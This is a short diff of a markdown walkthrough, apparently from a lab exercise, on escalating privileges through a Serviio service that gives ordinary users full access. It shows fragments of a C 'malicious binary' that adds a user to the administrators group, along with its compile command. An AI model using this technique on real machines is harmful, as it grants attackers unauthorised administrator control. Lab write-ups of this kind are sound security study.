@@ -331,6 +331,7 @@ We see that Serviio is running from the Program Files directory which means this
 
 ![[Pasted image 20220726104324.png]]
 We can see that the service allows members of the `BUILTIN\Users` group full access, a serious vulnerability. Lets leverage this to elevate our permissions. We start by compiling a malicious binary written in C that will add a user to the administrators group.
+
 code:
 ```C
 #include <stdlib.h>
@@ -345,6 +346,7 @@ int main ()
   return 0;
 }
 ```
+
 compiling:
 `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
 
